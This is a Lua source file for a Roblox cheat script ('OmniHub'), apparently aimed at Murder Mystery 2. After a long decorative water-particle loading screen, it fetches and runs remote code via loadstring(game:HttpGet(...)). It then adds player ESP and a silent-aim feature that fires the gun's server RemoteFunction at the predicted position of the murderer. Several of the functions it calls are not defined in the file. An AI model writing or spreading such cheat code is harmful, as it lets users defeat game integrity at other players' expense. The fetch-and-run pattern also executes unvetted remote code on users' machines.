progressFill.BackgroundColor3 = Color3.fromRGB(79, 149, 255)
progressFill.BorderSizePixel = 0
progressFill.BackgroundTransparency = 1
progressFill.ZIndex = 2
progressFill.Parent = progressContainer

-- Add corner to progress fill
local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 5)
fillCorner.Parent = progressFill

-- Create glow effect behind progress bar
local progressGlow = Instance.new("ImageLabel")
progressGlow.Name = "ProgressGlow"
progressGlow.BackgroundTransparency = 1
progressGlow.Position = UDim2.new(0, -10, 0, -10)
progressGlow.Size = UDim2.new(1, 20, 1, 20)
progressGlow.ZIndex = 1
progressGlow.Image = "rbxassetid://5028857084"
progressGlow.ImageColor3 = Color3.fromRGB(79, 149, 255)
progressGlow.ImageTransparency = 1
progressGlow.Parent = progressFill

-- Create fadeOut animation
local fadeOut = Instance.new("NumberValue")
fadeOut.Name = "FadeOut"
fadeOut.Value = 0
fadeOut.Parent = screenGui

-- Particle physics config
local GRAVITY = 0.5 -- Gravity strength
local WIND_STRENGTH = 0.08 -- Wind effect
local SPLASH_CHANCE = 0.3 -- Chance of creating splash particles
local MAX_ACTIVE_PARTICLES = 120 -- Limit particles for performance

-- Track active particles
local activeParticles = 0
local particles = {}

-- Create realistic water droplet
local function createWaterDroplet(startX, startY, size, initialVelocity)
    if activeParticles >= MAX_ACTIVE_PARTICLES then return nil end
    
    -- Randomize parameters for natural variation
    size = size or math.random(4, 18)
    local transparency = math.random(25, 50) / 100
    local velocityX = (initialVelocity and initialVelocity.X) or (math.random(-20, 20) / 100)
    local velocityY = (initialVelocity and initialVelocity.Y) or 0
    
    -- Create droplet with physics properties
    local droplet = Instance.new("Frame")
    droplet.Size = UDim2.new(0, size, 0, size * (1 + math.random(-20, 20) / 100)) -- Slightly oval shape
    droplet.Position = UDim2.new(0, startX, 0, startY)
    droplet.BackgroundColor3 = Color3.fromRGB(
        75 + math.random(-10, 10), 
        145 + math.random(-10, 10), 
        255 + math.random(-20, 0)
    )
    droplet.BackgroundTransparency = transparency
    droplet.BorderSizePixel = 0
    droplet.ZIndex = 2
    
    -- Physics properties (stored as attributes)
    droplet:SetAttribute("VelocityX", velocityX)
    droplet:SetAttribute("VelocityY", velocityY)
    droplet:SetAttribute("Mass", size / 10) -- Larger drops fall faster
    droplet:SetAttribute("LifeTime", 0)
    droplet:SetAttribute("MaxLife", math.random(40, 100))
    
    -- Round corners for water droplet look
    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0.5, 0)
    uiCorner.Parent = droplet
    
    -- Add subtle glow/refraction effect
    local dropletGlow = Instance.new("ImageLabel")
    dropletGlow.BackgroundTransparency = 1
    dropletGlow.Position = UDim2.new(0, -3, 0, -3)
    dropletGlow.Size = UDim2.new(1, 6, 1, 6)
    dropletGlow.ZIndex = 1
    dropletGlow.Image = "rbxassetid://5028857084"
    dropletGlow.ImageColor3 = Color3.fromRGB(150, 200, 255)
    dropletGlow.ImageTransparency = 0.7
    dropletGlow.Parent = droplet
    
    -- Add to tracking
    activeParticles = activeParticles + 1
    table.insert(particles, droplet)
    
    droplet.Parent = waterContainer
    return droplet
end

-- Create splash effect
local function createSplash(x, y, size)
    for i = 1, math.random(3, 8) do
        local splashSize = size * (math.random(30, 70) / 100)
        local angle = math.random(0, 360) * (math.pi/180)
        local power = math.random(20, 50) / 10
        
        local velocityX = math.cos(angle) * power
        local velocityY = -math.sin(angle) * power
        
        createWaterDroplet(x, y, splashSize, {X = velocityX, Y = velocityY})
    end
end

-- Create water ripple effect
local function createRipple(x, y, size)
    local ripple = Instance.new("ImageLabel")
    ripple.BackgroundTransparency = 1
    ripple.Position = UDim2.new(0, x - size/2, 0, y - size/2)
    ripple.Size = UDim2.new(0, size, 0, size)
    ripple.Image = "rbxassetid://3087045804" -- Circle ripple image
    ripple.ImageColor3 = Color3.fromRGB(120, 180, 255)
    ripple.ImageTransparency = 0.7
    ripple.ZIndex = 2
    ripple.Parent = splashesContainer
    
    -- Animate ripple
    TweenService:Create(
        ripple,
        TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {
            Size = UDim2.new(0, size * 3, 0, size * 3),
            Position = UDim2.new(0, x - size * 1.5, 0, y - size * 1.5),
            ImageTransparency = 1
        }
    ):Play()
    
    -- Clean up ripple
    game:GetService("Debris"):AddItem(ripple, 1)
end

-- Update water particle physics
local function updateWaterPhysics()
    local toRemove = {}
    
    for i, droplet in ipairs(particles) do
        if not droplet:IsDescendantOf(game) then
            table.insert(toRemove, i)
            continue
        end
        
        -- Get current state
        local x = droplet.Position.X.Offset
        local y = droplet.Position.Y.Offset
        local velocityX = droplet:GetAttribute("VelocityX") 
        local velocityY = droplet:GetAttribute("VelocityY")
        local mass = droplet:GetAttribute("Mass")
        local lifeTime = droplet:GetAttribute("LifeTime") + 1
        local maxLife = droplet:GetAttribute("MaxLife")
        
        -- Apply physics
        velocityY = velocityY + (GRAVITY * mass)
        velocityX = velocityX + (math.random(-10, 10) / 100) * WIND_STRENGTH
        
        -- Apply slight damping to simulate air resistance
        velocityX = velocityX * 0.99
        
        -- Update position
        local newX = x + velocityX
        local newY = y + velocityY
        
        -- Handle water surface collision
        if waterSurface.Visible and newY >= waterSurface.Position.Y.Offset and velocityY > 0 then
            -- Create splash and ripple on impact
            if velocityY > 1 and math.random() < SPLASH_CHANCE then
                createSplash(x, waterSurface.Position.Y.Offset, droplet.Size.X.Offset)
                createRipple(x, waterSurface.Position.Y.Offset, droplet.Size.X.Offset * 2)
            end
            
            -- Bounce effect with dampening
            velocityY = -velocityY * 0.4
            velocityX = velocityX * 0.8
            
            -- Adjust position to surface
            newY = waterSurface.Position.Y.Offset
        end
        
        -- Handle wall collisions
        if newX < 0 or newX > waterContainer.AbsoluteSize.X then
            velocityX = -velocityX * 0.8
            newX = math.clamp(newX, 0, waterContainer.AbsoluteSize.X)
        end
        
        -- Update droplet
        droplet.Position = UDim2.new(0, newX, 0, newY)
        droplet:SetAttribute("VelocityX", velocityX)
        droplet:SetAttribute("VelocityY", velocityY)
        droplet:SetAttribute("LifeTime", lifeTime)
        
        -- Handle lifetime and fading
        if lifeTime > maxLife * 0.7 then
            local fadeProgress = (lifeTime - maxLife * 0.7) / (maxLife * 0.3)
            droplet.BackgroundTransparency = math.min(1, droplet:FindFirstChildOfClass("ImageLabel").ImageTransparency + fadeProgress * 0.3)
            droplet:FindFirstChildOfClass("ImageLabel").ImageTransparency = math.min(1, droplet:FindFirstChildOfClass("ImageLabel").ImageTransparency + fadeProgress * 0.3)
        end
        
        -- Remove drops that have lived their life or fallen far offscreen
        if lifeTime >= maxLife or newY > waterContainer.AbsoluteSize.Y + 100 then
            table.insert(toRemove, i)
        end
    end
    
    -- Remove destroyed particles (in reverse order to avoid index shifting)
    for i = #toRemove, 1, -1 do
        if particles[toRemove[i]] and particles[toRemove[i]]:IsDescendantOf(game) then
            particles[toRemove[i]]:Destroy()
        end
        table.remove(particles, toRemove[i])
        activeParticles = math.max(0, activeParticles - 1)
    end
end

-- Generates rain drops from the top
local function generateRain(intensity, duration)
    local startTime = tick()
    local waterWidth = waterContainer.AbsoluteSize.X
    
    -- Rain generation loop
    while tick() - startTime < duration do
        for i = 1, intensity do
            local xPos = math.random(0, waterWidth)
            local size = math.random(5, 15)
            local droplet = createWaterDroplet(xPos, -20, size)
            
            if droplet then
                -- Set initial velocity for rain
                droplet:SetAttribute("VelocityY", math.random(3, 7))
                droplet:SetAttribute("VelocityX", math.random(-10, 10) / 100)
            end
        end
        wait(0.05)
    end
end

-- Create rising water effect
local function riseWaterLevel(targetHeight, duration)
    waterSurface.Visible = true
    local startHeight = waterSurface.Size.Y.Offset
    local startPos = waterSurface.Position.Y.Offset
    local targetPos = waterContainer.AbsoluteSize.Y - targetHeight
    
    -- Animate water rising
    TweenService:Create(
        waterSurface,
        TweenInfo.new(duration, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out),
        {
            Size = UDim2.new(1, 0, 0, targetHeight),
            Position = UDim2.new(0, 0, 0, targetPos)
        }
    ):Play()
    
    -- Create bubbles and small upward splash particles while rising
    local startTime = tick()
    while tick() - startTime < duration do
        local currentHeight = waterSurface.Position.Y.Offset
        
        -- Create some upward moving particles at the surface
        for i = 1, math.random(1, 3) do
            local xPos = math.random(0, waterContainer.AbsoluteSize.X)
            local size = math.random(3, 8)
            local droplet = createWaterDroplet(xPos, currentHeight, size)
            
            if droplet then
                droplet:SetAttribute("VelocityY", math.random(-30, -10) / 10)
                droplet:SetAttribute("VelocityX", math.random(-20, 20) / 100)
            end
        end
        
        wait(0.1)
    end
end

-- Create falling water effect (draining)
local function drainWaterLevel(duration)
    if not waterSurface.Visible then return end
    
    local startHeight = waterSurface.Size.Y.Offset
    local targetHeight = 0
    local startPos = waterSurface.Position.Y.Offset
    local targetPos = waterContainer.AbsoluteSize.Y
    
    -- Create droplets at surface that fall down
    for i = 1, 50 do
        local xPos = math.random(0, waterContainer.AbsoluteSize.X)
        local currentHeight = waterSurface.Position.Y.Offset
        local size = math.random(5, 15)
        local droplet = createWaterDroplet(xPos, currentHeight, size)
        
        if droplet then
            droplet:SetAttribute("VelocityY", math.random(10, 30) / 10)
            droplet:SetAttribute("VelocityX", math.random(-30, 30) / 100)
        end
    end
    
    -- Animate water falling
    TweenService:Create(
        waterSurface,
        TweenInfo.new(duration, Enum.EasingStyle.Cubic, Enum.EasingDirection.In),
        {
            Size = UDim2.new(1, 0, 0, targetHeight),
            Position = UDim2.new(0, 0, 0, targetPos)
        }
    ):Play()
    
    wait(duration)
    waterSurface.Visible = false
end

-- Start physics update loop
local physicsConnection
local function startPhysics()
    physicsConnection = RunService.Heartbeat:Connect(updateWaterPhysics)
end

local function stopPhysics()
    if physicsConnection then
        physicsConnection:Disconnect()
        physicsConnection = nil
    end
end

-- Main loading sequence
local function startLoader()
    startPhysics()
    
    -- Initial light rain
    spawn(function()
        generateRain(3, 4) -- Light rain for 4 seconds
    end)
    
    -- Fade in frame with initial droplets
    for i = 10, 0, -1 do
        mainFrame.BackgroundTransparency = i/10
        dropShadow.ImageTransparency = i/10
        wait(0.05)
    end
    
    -- Heavy rain starts filling the container
    spawn(function()
        generateRain(8, 3) -- Heavy rain for 3 seconds
    end)
    
    -- Start forming the water level
    riseWaterLevel(250, 3)
    
    -- Show UI elements with ripple effect from the center
    local centerX = mainFrame.AbsoluteSize.X / 2
    local centerY = mainFrame.AbsoluteSize.Y / 2
    createRipple(centerX, centerY, 100)
    
    -- Fade in UI elements with a slight delay between each
    for i = 10, 0, -1 do
        logo.ImageTransparency = i/10
        wait(0.03)
        title.TextTransparency = i/10
        wait(0.03)
        versionText.TextTransparency = i/10
        wait(0.03)
        statusText.TextTransparency = i/10
        wait(0.03)
        progressContainer.BackgroundTransparency = i/10
        progressFill.BackgroundTransparency = i/10
        progressGlow.ImageTransparency = 0.7 + (i/30)
        wait(0.03)
    end
    
    -- Loading sequence
    local loadingSteps = {
        "Checking Modules...",
        "Loading Scripts...",
        "Getting Common Information..."
    }
    
    -- Progress loading
    for i, step in ipairs(loadingSteps) do
        statusText.Text = step
        
        local startFill = (i-1)/3
        local endFill = i/3
        
        for j = 1, 20 do  -- Each step takes 2 seconds (20 * 0.1)
            local progress = startFill + ((endFill - startFill) * (j/20))
            progressFill.Size = UDim2.new(progress, 0, 1, 0)
            
            -- Create droplet effect from the progress bar
            if math.random() < 0.3 then
                local progressX = progressContainer.AbsolutePosition.X + 
                                 (progressFill.Size.X.Scale * progressContainer.AbsoluteSize.X)
                local progressY = progressContainer.AbsolutePosition.Y
                
                local droplet = createWaterDroplet(
                    progressX - mainFrame.AbsolutePosition.X,
                    progressY - mainFrame.AbsolutePosition.Y,
                    math.random(3, 6)
                )
                
                if droplet then
                    droplet:SetAttribute("VelocityY", math.random(5, 15) / 10)
                    droplet:SetAttribute("VelocityX", math.random(-10, 10) / 100)
                end
            end
            
            wait(0.1)
        end
    end
    
    -- Final loading period
    statusText.Text = "Finalizing..."
    progressFill.Size = UDim2.new(1, 0, 1, 0)
    
    -- Pulse effect on completion
    TweenService:Create(
        progressGlow, 
        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {ImageTransparency = 0.5}
    ):Play()
    
    wait(0.6)
    
    TweenService:Create(
        progressGlow, 
        TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
        {ImageTransparency = 0.7}
    ):Play()
    
    wait(1)
    
    -- Outro transition - start draining water
for i = 0, 10 do
    local transparency = i/10
    title.TextTransparency = transparency
    logo.ImageTransparency = transparency
    versionText.TextTransparency = transparency
    statusText.TextTransparency = transparency
    progressContainer.BackgroundTransparency = transparency
    progressFill.BackgroundTransparency = transparency
    progressGlow.ImageTransparency = 0.7 + (transparency/3)
    wait(0.03)
end

-- Drain the water
drainWaterLevel(2)

-- Heavy rain effect as everything dissolves
spawn(function()
    generateRain(10, 3) -- Very heavy rain for 3 seconds
end)

-- Start fading out main frame
for i = 0, 10 do
    local transparency = i/10
    mainFrame.BackgroundTransparency = transparency
    dropShadow.ImageTransparency = transparency
    wait(0.05)
end

-- Create breaking water effect
for i = 1, 150 do
    local xPos = math.random(0, waterContainer.AbsoluteSize.X)
    local yPos = math.random(0, waterContainer.AbsoluteSize.Y)
    local size = math.random(5, 15)
    local droplet = createWaterDroplet(xPos, yPos, size)
    
    if droplet then
        -- Add explosive velocity in random directions
        local angle = math.random(0, 360) * (math.pi/180)
        local power = math.random(30, 80) / 10
        
        droplet:SetAttribute("VelocityX", math.cos(angle) * power)
        droplet:SetAttribute("VelocityY", math.sin(angle) * power)
        droplet:SetAttribute("MaxLife", math.random(30, 60)) -- Shorter life
    end
    
    -- Create droplets in small batches for more natural look
    if i % 10 == 0 then
        wait(0.01)
    end
end

-- Final water dissipation effect
for i = 1, activeParticles do
    if i <= #particles and particles[i] and particles[i]:IsDescendantOf(game) then
        TweenService:Create(
            particles[i],
            TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = 1}
        ):Play()
        
        if particles[i]:FindFirstChildOfClass("ImageLabel") then
            TweenService:Create(
                particles[i]:FindFirstChildOfClass("ImageLabel"),
                TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {ImageTransparency = 1}
            ):Play()
        end
    end
    
    -- Process in small batches for performance
    if i % 20 == 0 then
        wait(0.02)
    end
end

-- Create and play fadeOut animation
local fadeOutTween = TweenService:Create(
    fadeOut,
    TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
    {Value = 1}
)

fadeOutTween:Play()
fadeOutTween.Completed:Wait()

-- Clean up
stopPhysics()
for _, particle in ipairs(particles) do
    if particle:IsDescendantOf(game) then
        particle:Destroy()
    end
end
particles = {}
activeParticles = 0

-- Optional: Play a final splash sound effect
local splashSound = Instance.new("Sound")
splashSound.SoundId = "rbxassetid://5157776222" -- Replace with appropriate splash sound
splashSound.Volume = 0.5
splashSound.Parent = mainFrame
splashSound:Play()

wait(0.5)
screenGui:Destroy()
end

-- Start the loading sequence
startLoader()

-- Fluent UI Integration (preserved from original code)
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
  Title = "OmniHub Script By Azzakirms",
  SubTitle = "V1.1.5",
  TabWidth = 100,
  Size = UDim2.fromOffset(380, 300),
  Acrylic = true,
  Theme = "Dark",
  MinimizeKey = Enum.KeyCode.LeftControl
})

-- Create tabs
local Tabs = {
   Main = Window:AddTab({ Title = "Main", Icon = "eye" }),
   Visuals = Window:AddTab({ Title = "Visuals", Icon = "camera" }),
   Combat = Window:AddTab({ Title = "Combat", Icon = "crosshair" }),
   Farming = Window:AddTab({ Title = "Farming", Icon = "dollar-sign" }),
   Premium = Window:AddTab({ Title = "Premium", Icon = "star" }),
   Discord = Window:AddTab({ Title = "Join Discord", Icon = "message-square" }),
   Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

-- Add ESP toggle to Visuals tab
Tabs.Visuals:AddSection("Character ESP")

-- FIX: Properly implement toggle callback
Tabs.Visuals:AddToggle("ESPToggle", {
   Title = "Esp Players",
   Default = ESP.Enabled,
   Callback = function(Value)
       ToggleESP(Value)
   end
})

local SilentAimToggleV3 = Tabs.Combat:AddToggle("SilentAimToggleV3", {
   Title = "Silent Aim",
   Default = false,
   Callback = function(toggle)
       SilentAimButtonV3.Visible = toggle
   end
})

-- Algorithm Type Dropdown
local SelectedAlgorithm = "Algorithm" -- Default algorithm
local SilentAimChoice = Tabs.Main:AddDropdown("SilentAimChoice", {
   Title = "Algorithm Type",
   Values = {"Algorithm", "Jet", "Adaptive"},
   Default = "Algorithm",
   Callback = function(choice)
       SelectedAlgorithm = choice
   end
})

-- Silent Aim V3 Button Click Event
SilentAimButtonV3.MouseButton1Click:Connect(function()
   local localPlayer = game.Players.LocalPlayer
   local gun = localPlayer.Character:FindFirstChild("Gun") or localPlayer.Backpack:FindFirstChild("Gun")
   if not gun then return end
   local murderer = GetMurderer() -- Assume this function exists and returns the murderer
   if not murderer then return end
   
   -- Try to equip the gun if not already equipped
   if gun.Parent == localPlayer.Backpack then
       localPlayer.Character.Humanoid:EquipTool(gun)
       -- Small delay to ensure gun is equipped
       task.wait(0.1)
   end
   
   -- Use the selected algorithm type
   local predictedPos = predictMurderV3(murderer, SelectedAlgorithm or "Algorithm")
   if predictedPos then
       -- Attempt to fire the gun at the predicted position
       gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(1, predictedPos, "AH2")
   end
end)

-- Initialize SaveManager
SaveManager:SetLibrary(Fluent)
SaveManager:SetFolder("OmniHub/MM2")
SaveManager:BuildConfigSection(Tabs.Settings)

-- Initialize InterfaceManager
InterfaceManager:SetLibrary(Fluent)
InterfaceManager:SetFolder("OmniHub")
InterfaceManager:BuildInterfaceSection(Tabs.Settings)

-- FIX: Proper initialization sequence
local function Initialize()
    -- Setup all connections
    SetupRoleTracking()
    SetupGunTracking()
    SetupPlayerConnections()
    
    -- Start ESP update loop with proper update frequency
    local ESPUpdateConnection = RunService.RenderStepped:Connect(UpdateESP)
    
    -- FIX: Proper cleanup without using BindToClose (client-side only)
    local cleanupFunction = function()
        -- Disconnect all connections
        if RoleUpdateConnection then RoleUpdateConnection:Disconnect() end
        if PlayerAddedConnection then PlayerAddedConnection:Disconnect() end
        if PlayerRemovingConnection then PlayerRemovingConnection:Disconnect() end
        if ESPUpdateConnection then ESPUpdateConnection:Disconnect() end
        
        for _, conn in pairs(GunTrackingConnections) do
            conn:Disconnect()
        end
        
        -- Clean up all highlights
        for player, highlight in pairs(Highlights) do
            if highlight and highlight.Parent then
                highlight:Destroy()
            end
        end
        
        -- Remove the highlight folder
        if HighlightFolder and HighlightFolder.Parent then
            HighlightFolder:Destroy()
        end
    end
    
    -- Register cleanup function for script termination
    if getgenv then
        getgenv().ESPCleanupFunction = cleanupFunction
    end
    
    -- Success notification
    Fluent:Notify({
       Title = "Enhanced ESP Loaded",
       Content = "Improved character outlines are now active",
       Duration = 3
    })
    
    -- Load saved configuration
    SaveManager:LoadAutoloadConfig()
end

-- Start the initialization process
Initialize()
